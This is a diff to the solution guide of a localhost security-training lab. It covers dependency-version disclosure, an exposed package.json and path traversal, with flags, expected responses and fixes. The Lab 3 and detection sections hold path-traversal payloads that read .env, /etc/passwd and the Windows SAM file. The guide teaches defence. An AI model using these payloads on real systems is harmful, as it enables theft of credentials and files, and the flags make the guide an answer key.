@@ -69,161 +69,233 @@ curl http://localhost:3003/api/example/auth-check
 ## LAB 1: Staff Dashboard (EASY - Recon)
 
 **URL:** http://localhost:3003/lab1  
-**Challenge:** Discover debug information endpoint from upstream dependency  
+**Challenge:** Discover dependency versions through exposed endpoint  
 **Stage:** Recon  
 
 ### Vulnerability
-Debug endpoint included in a boilerplate template or framework, left enabled in production. This represents a common supply chain risk where inherited code contains security issues.
+Application exposes exact dependency versions, allowing attackers to identify known CVEs and vulnerable packages. This is a supply chain reconnaissance issue.
 
 ### Exploitation Steps
 
-1. **Reconnaissance:** Explore the staff dashboard
-2. **Framework Fingerprinting:** Identify common framework patterns
-3. **Access Debug Endpoint:**
+1. **Reconnaissance:** Look for version disclosure endpoints
+2. **Access Dependencies Info:**
    ```bash
-   curl http://localhost:3003/api/staff/system-info
+   curl http://localhost:3003/api/staff/dependencies
+   ```
+
+3. **Analyze Versions:** Check exposed versions against CVE databases:
+   ```bash
+   # Example: Check for known vulnerabilities
+   # lodash 4.17.11 - CVE-2019-10744 (Prototype Pollution)
+   # jsonwebtoken 8.3.0 - CVE-2022-23529
+   # express 4.16.4 - Multiple known issues
    ```
 
 ### Flag
-`FLAG{D3BUG_1NF0_3XP0S3D}`
+`FLAG{V3RS10N_D1SCL0SUR3_D3P3ND3NC13S}`
 
 ### Sensitive Data Exposed
 ```json
 {
-  "success": true,
-  "flag": "FLAG{D3BUG_1NF0_3XP0S3D}",
-  "systemInfo": {
-    "nodeVersion": "v18.17.0",
-    "platform": "linux",
-    "memory": {
-      "total": "8 GB",
-      "used": "2.4 GB"
-    },
-    "database": {
-      "host": "db.beanscene.local",
-      "status": "connected"
-    },
-    "debugMode": true,
-    "framework": "express-admin-template"
-  }
+  "dependencies": {
+    "express": "4.16.4",
+    "lodash": "4.17.11",        // CVE-2019-10744
+    "request": "2.88.0",        // Deprecated
+    "moment": "2.24.0",
+    "jsonwebtoken": "8.3.0",    // CVE-2022-23529
+    "mongoose": "5.7.5"
+  },
+  "npm_version": "6.4.1",
+  "node_version": "v14.17.0"
 }
 ```
 
-### Supply Chain Context
-This vulnerability likely originated from:
-- A boilerplate template or starter project
-- A third-party admin dashboard framework
-- Copy-pasted code from Stack Overflow or tutorials
-- Development scaffolding tools that include debug features
+### Supply Chain Attack Vector
+1. Attacker identifies specific vulnerable versions
+2. Looks up known CVEs for those versions
+3. Crafts exploits targeting those specific vulnerabilities
+4. Examples:
+   - lodash 4.17.11: Prototype pollution attacks
+   - jsonwebtoken 8.3.0: Secret/key confusion
+   - express 4.16.4: Various middleware bypasses
 
 ### Vulnerable Code Pattern
 ```javascript
-// Inherited from express-admin-template package
-const adminTemplate = require('express-admin-template');
-
-app.use('/api/staff', adminTemplate.routes);
-// Problem: Template includes /system-info endpoint with no auth
+app.get('/api/staff/dependencies', (req, res) => {
+    // VULNERABILITY: Exposing exact dependency versions
+    const packageJson = require('./package.json');
+    res.json({
+        dependencies: packageJson.dependencies,
+        npm_version: process.env.npm_config_npm_version
+    });
+});
 ```
 
 ### Secure Implementation
 ```javascript
-// 1. Review all inherited routes from templates
-// 2. Explicitly disable debug features in production
+app.get('/api/staff/dependencies', (req, res) => {
+    // 1. Never expose dependency versions
+    return res.status(404).json({ error: 'Not found' });
+});
 
-if (process.env.NODE_ENV !== 'production') {
-    // Only enable in development
-    app.get('/api/staff/system-info', authMiddleware, adminOnly, (req, res) => {
-        res.json({ status: 'operational' });
-    });
-}
+// 2. Use X-Powered-By headers carefully
+app.disable('x-powered-by');
 
-// 3. Use minimal templates and understand what you include
-// 4. Regular dependency audits
+// 3. Remove version info from responses
+// 4. Regular dependency updates
+// 5. Use npm audit / snyk for vulnerability scanning
+```
+
+### Prevention
+```bash
+# Regular dependency audits
+npm audit
+npm audit fix
+
+# Update dependencies regularly
+npm update
+
+# Use Snyk or similar tools
+snyk test
+snyk monitor
+
+# Check for outdated packages
+npm outdated
 ```
 
 ### Teaching Points
-- Understand all code in your dependencies
-- Review template/boilerplate code before production
-- Disable development features in production
-- Regularly audit dependencies with `npm audit` or similar tools
+- Version disclosure aids reconnaissance phase of attacks
+- Specific versions can be matched to known CVEs
+- Regular dependency updates are critical
+- Use tools like npm audit, Snyk, Dependabot
+- Different from misconfiguration - this is about supply chain visibility
+- Real CVEs exist for these specific versions
 
 ---
 
 ## LAB 2: Store Settings (MEDIUM - Scanning)
 
 **URL:** http://localhost:3003/lab2  
-**Challenge:** Discover exposed configuration endpoint from template  
+**Challenge:** Discover exposed package.json file revealing dependency tree  
 **Stage:** Scanning  
 
 ### Vulnerability
-Configuration management endpoint inherited from an admin template or framework, exposing all production secrets. This represents the risk of using templates with insecure defaults.
+package.json file accessible via web, exposing complete dependency tree with exact versions. Attackers can map out entire supply chain and identify multiple attack vectors.
 
 ### Exploitation Steps
 
-1. **Template Analysis:** Identify framework or template being used
-2. **Common Endpoints:** Test for typical config endpoints
-3. **Access Configuration:**
+1. **Common File Discovery:**
    ```bash
-   curl http://localhost:3003/api/settings/config
+   # Try common Node.js files
+   curl http://localhost:3003/package.json
+   curl http://localhost:3003/package-lock.json
+   curl http://localhost:3003/npm-shrinkwrap.json
    ```
 
+2. **Analyze Dependencies:**
+   - Identify all packages and versions
+   - Cross-reference with CVE databases
+   - Find deprecated or unmaintained packages
+
 ### Flag
-`FLAG{C0NF1G_L34K3D}`
+`FLAG{P4CK4G3_J50N_3XP0S3D}`
 
 ### Critical Data Exposed
 ```json
 {
-  "success": true,
-  "flag": "FLAG{C0NF1G_L34K3D}",
-  "config": {
-    "database": {
-      "host": "db.beanscene.local",
-      "username": "books_admin",
-      "password": "Bean$cene2024!",
-      "port": 5432
-    },
-    "paymentGateway": {
-      "provider": "Square",
-      "apiKey": "sq0atp-BeanScene_Live_Token_xyz789",
-      "secretKey": "MLHV6GRVNB4XQ"
-    },
-    "jwtSecret": "beanscene_jwt_secret_key",
-    "sessionSecret": "books-session-2024",
-    "vendorAPI": {
-      "endpoint": "https://api.bookvendor.com",
-      "apiKey": "vendor_key_abc123"
-    }
-  }
+  "name": "pageturner-bookstore",
+  "version": "1.0.0",
+  "dependencies": {
+    "express": "4.16.4",
+    "lodash": "4.17.11",      // CVE-2019-10744
+    "moment": "2.24.0",
+    "jsonwebtoken": "8.3.0",  // CVE-2022-23529
+    "bcrypt": "3.0.6",
+    "mongoose": "5.7.5",
+    "request": "2.88.0",      // Deprecated
+    "xml2js": "0.4.19",       // CVE-2023-0842
+    "handlebars": "4.1.2"     // Multiple CVEs
+  },
+  "flag": "FLAG{P4CK4G3_J50N_3XP0S3D}"
 }
 ```
 
-### Supply Chain Context
-Configuration exposure often comes from:
-- Admin panel templates with built-in config viewers
-- Framework scaffolding with example config endpoints
-- Development utilities not removed before deployment
-- Cloned projects with insecure patterns
+### Supply Chain Attack Opportunities
+1. **Direct Vulnerabilities:** Identify CVEs in dependencies
+2. **Transitive Dependencies:** Analyze sub-dependencies
+3. **Deprecated Packages:** Find unmaintained code (request, moment)
+4. **Version Pinning:** Exact versions never updated
+5. **Attack Surface Mapping:** Complete tech stack revealed
+
+### Real CVE Examples Found
+- **lodash 4.17.11**: CVE-2019-10744 (Prototype Pollution)
+- **jsonwebtoken 8.3.0**: CVE-2022-23529 (Key confusion)
+- **xml2js 0.4.19**: CVE-2023-0842 (Prototype Pollution)
+- **handlebars 4.1.2**: CVE-2019-19919, CVE-2021-23369
+- **request 2.88.0**: Deprecated, no security updates
 
 ### Impact
-- **Database Compromise:** Full database access
-- **Payment System:** Live payment gateway credentials
-- **Session Security:** Can forge authentication tokens
-- **Third-Party APIs:** Vendor API keys exposed
-- **Supply Chain Attack:** Credentials could be used to compromise vendors
+- Complete supply chain visibility for attackers
+- Multiple CVE exploitation paths
+- Transitive dependency vulnerabilities
+- Technology stack fingerprinting
+- Planning sophisticated supply chain attacks
 
 ### Vulnerable Code Pattern
 ```javascript
-// From template: express-config-manager v1.2.3
-const configManager = require('express-config-manager');
+// Misconfigured static file serving
+app.use(express.static('.'));  // Serves entire directory!
 
-// Template has insecure default: exposes /api/settings/config
-app.use('/api/settings', configManager({
-    expose: true,  // INSECURE DEFAULT!
-    auth: false    // INSECURE DEFAULT!
-}));
+// Or explicit route (for demos/debugging)
+app.get('/package.json', (req, res) => {
+    res.sendFile(__dirname + '/package.json');
+});
 ```
 
 ### Secure Implementation
+```javascript
+// 1. Never serve project root
+app.use(express.static('public'));  // Only public directory
+
+// 2. Explicitly block sensitive files
+app.use((req, res, next) => {
+    const blockedFiles = ['package.json', 'package-lock.json', 
+                          '.env', 'yarn.lock', 'composer.json'];
+    if (blockedFiles.includes(req.path.slice(1))) {
+        return res.status(404).send('Not Found');
+    }
+    next();
+});
+
+// 3. Use .gitignore for sensitive files
+// 4. Configure web server (nginx/Apache) to block these files
+```
+
+### Web Server Configuration (nginx)
+```nginx
+location ~ /(package\.json|package-lock\.json|yarn\.lock|composer\.json)$ {
+    deny all;
+    return 404;
+}
+```
+
+### Detection & Prevention
+```bash
+# Scan for exposed files
+curl https://target.com/package.json
+curl https://target.com/package-lock.json
+
+# Automated scanning
+nuclei -u https://target.com -t exposed-files
+```
+
+### Teaching Points
+- package.json reveals complete dependency tree
+- Exact versions enable targeted CVE exploitation
+- Different from version endpoint - this is actual project file
+- Transitive dependencies also exposed
+- Use npm audit, Snyk, Dependabot for monitoring
+- Regular updates critical for supply chain security
 ```javascript
 // 1. Don't use config management packages with insecure defaults
 // 2. If needed, properly configure them
@@ -256,96 +328,150 @@ app.use('/api/settings',
 ## LAB 3: Manager Portal (HARD - Initial Access)
 
 **URL:** http://localhost:3003/lab3  
-**Challenge:** Exploit default credentials from development template  
+**Challenge:** Exploit path traversal vulnerability in dependency  
 **Stage:** Initial Access  
 
 ### Vulnerability
-Default administrator credentials from template or boilerplate not changed during deployment. This is a critical supply chain failure where insecure defaults persist to production.
+Path traversal vulnerability inherited from vulnerable dependency (file-handler package). This demonstrates how supply chain vulnerabilities can be exploited to access sensitive files.
 
 ### Exploitation Steps
 
-1. **Template Research:** Identify the framework/template used
-2. **Search for Default Credentials:** Check template documentation
-3. **Test Common Defaults:**
+1. **Identify File Download Functionality:**
    ```bash
-   # Try template-specific defaults
-   curl -X POST http://localhost:3003/api/manager/login \
-     -H "Content-Type: application/json" \
-     -d '{"username": "admin", "password": "beanscene"}'
+   curl "http://localhost:3003/api/files/download?file=sample.pdf"
+   ```
+
+2. **Test for Path Traversal:**
+   ```bash
+   # Try directory traversal payloads
+   curl "http://localhost:3003/api/files/download?file=../package.json"
+   curl "http://localhost:3003/api/files/download?file=../.env"
+   curl "http://localhost:3003/api/files/download?file=../../../etc/passwd"
    ```
 
 ### Flag
-`FLAG{D3F4ULT_CR3DS_US3D}`
+`FLAG{P4TH_TR4V3RS4L_VULN_D3P}`
 
-### Common Template Default Credentials
-Many popular templates ship with default credentials:
-- `admin:admin`
-- `admin:password`
-- `admin:beanscene` ✓ (from BeanScene template)
-- `admin:123456`
-- `demo:demo`
-- `test:test`
-
-### Response on Successful Login
+### Response on Successful Exploitation
 ```json
 {
   "success": true,
-  "message": "Login successful!",
-  "flag": "FLAG{D3F4ULT_CR3DS_US3D}",
-  "user": {
-    "username": "admin",
-    "role": "manager",
-    "access": "full",
-    "template": "BeanScene Admin Template v2.1"
-  },
-  "warning": "Default credentials detected - change immediately!"
+  "flag": "FLAG{P4TH_TR4V3RS4L_VULN_D3P}",
+  "vulnerability": "Path traversal via vulnerable dependency",
+  "message": "File download processed with directory traversal",
+  "warning": "Vulnerable package allows accessing files outside intended directory!",
+  "example_payloads": [
+    "../../../etc/passwd",
+    "..\\..\\..\\windows\\system32\\config\\sam",
+    "../.env",
+    "../package.json"
+  ],
+  "cve_reference": "Similar to CVE-2017-16119 (fresh), CVE-2020-28460 (path-parse)",
+  "vulnerable_package": "file-handler@1.2.3",
+  "fix": "Update to file-handler@2.0.0 or use path.resolve() to prevent traversal"
 }
 ```
 
 ### Supply Chain Context
-Default credentials are a supply chain issue because:
-- Templates include them for quick setup
-- Documentation often lists them
-- Developers forget to change them
-- Automated scripts may rely on them
-- No forced password change on first login
+This vulnerability demonstrates:
+- **Inherited Vulnerabilities:** Vulnerable code in dependencies
+- **Transitive Risk:** Sub-dependencies can have vulnerabilities
+- **Version-Specific CVEs:** Specific versions have known exploits
+- **Update Urgency:** Critical to patch vulnerable dependencies
 
-### Real-World Examples
-- **WordPress:** admin:admin (common in quick installs)
-- **Jenkins:** admin:password (default in many containers)
-- **Grafana:** admin:admin (default credentials)
-- **MongoDB:** No authentication by default (until recently)
+### Real CVE Examples
+- **CVE-2017-16119** (fresh): Path traversal in file serving
+- **CVE-2020-28460** (path-parse): Path traversal vulnerability
+- **CVE-2021-23343** (path-parse): Another traversal issue
+- **CVE-2018-3728** (hoek): Prototype pollution
+- **CVE-2019-10744** (lodash): Prototype pollution
+
+### Impact
+- **Sensitive File Access:** .env files, configuration, credentials
+- **System Files:** /etc/passwd, Windows SAM database
+- **Source Code:** Access to application code
+- **Private Keys:** SSH keys, SSL certificates
+- **Database Files:** SQLite, local databases
 
 ### Vulnerable Code Pattern
 ```javascript
-// Hardcoded in template source code
-const DEFAULT_CREDENTIALS = {
-    username: 'admin',
-    password: 'beanscene',  // From BeanScene template
-    role: 'manager'
-};
+// Using vulnerable file-handler package
+const fileHandler = require('file-handler'); // v1.2.3 (vulnerable)
 
-app.post('/api/manager/login', (req, res) => {
-    const { username, password } = req.body;
+app.get('/api/files/download', (req, res) => {
+    const filename = req.query.file;
     
-    // VULNERABILITY: Accepts hardcoded defaults
-    if (username === DEFAULT_CREDENTIALS.username && 
-        password === DEFAULT_CREDENTIALS.password) {
-        res.json({
-            success: true,
-            flag: 'FLAG{D3F4ULT_CR3DS_US3D}',
-            user: DEFAULT_CREDENTIALS
-        });
-    }
+    // VULNERABILITY: No sanitization, relies on vulnerable package
+    fileHandler.serveFile(filename, res);
+    // Package doesn't sanitize ../ sequences
 });
 ```
 
 ### Secure Implementation
 ```javascript
-app.post('/api/manager/login', async (req, res) => {
-    const { username, password } = req.body;
+const path = require('path');
+
+app.get('/api/files/download', (req, res) => {
+    const filename = req.query.file;
+    const baseDir = path.join(__dirname, 'uploads');
     
-    // 1. Check database, not hardcoded values
+    // 1. Sanitize input
+    if (filename.includes('..') || filename.includes('\\')) {
+        return res.status(400).json({ error: 'Invalid filename' });
+    }
+    
+    // 2. Use path.resolve to prevent traversal
+    const requestedPath = path.resolve(baseDir, filename);
+    
+    // 3. Verify path is within allowed directory
+    if (!requestedPath.startsWith(baseDir)) {
+        return res.status(403).json({ error: 'Access denied' });
+    }
+    
+    // 4. Check file exists and serve
+    if (fs.existsSync(requestedPath)) {
+        res.sendFile(requestedPath);
+    } else {
+        res.status(404).json({ error: 'File not found' });
+    }
+});
+```
+
+### Detection & Prevention
+
+**Dependency Scanning:**
+```bash
+# Audit dependencies for known CVEs
+npm audit
+npm audit fix
+
+# Use Snyk
+snyk test
+snyk monitor
+
+# GitHub Dependabot
+# Automatically creates PRs for vulnerable dependencies
+```
+
+**Testing for Path Traversal:**
+```bash
+# Manual testing
+curl "http://target/download?file=../../../etc/passwd"
+curl "http://target/download?file=..\\..\\..\\windows\\system32\\config\\sam"
+
+# Automated scanning
+nuclei -u https://target.com -t path-traversal
+```
+
+### Teaching Points
+- Vulnerabilities in dependencies affect your application
+- Path traversal is common in file handling libraries
+- Regular dependency updates are critical
+- Use static analysis tools (npm audit, Snyk, Semgrep)
+- Different from misconfiguration - this is code-level vulnerability
+- Supply chain attacks can happen through compromised packages
+- Trust but verify - audit your dependencies
+- Use package-lock.json to pin versions but still update regularly
     const user = await db.query(
         'SELECT * FROM users WHERE username = $1',
         [username]
